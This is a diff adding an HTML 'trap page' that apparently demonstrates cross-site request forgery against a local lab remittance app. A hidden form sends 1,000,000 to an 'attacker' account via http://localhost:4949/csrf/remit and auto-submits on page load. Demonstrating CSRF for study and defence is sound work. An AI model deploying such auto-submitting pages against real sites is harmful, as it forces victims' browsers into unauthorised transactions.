@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>罠ページ</title>
+</head>
+<body>
+    <form action="http://localhost:4949/csrf/remit" id="remit" method="post">
+        <input type="text" name="to" value="攻撃者">
+        <input type="text" name="amount" value="1000000">
+    </form>
+    <script>
+        document.querySelector("#remit").submit();
+    </script>
+</body>
+</html>
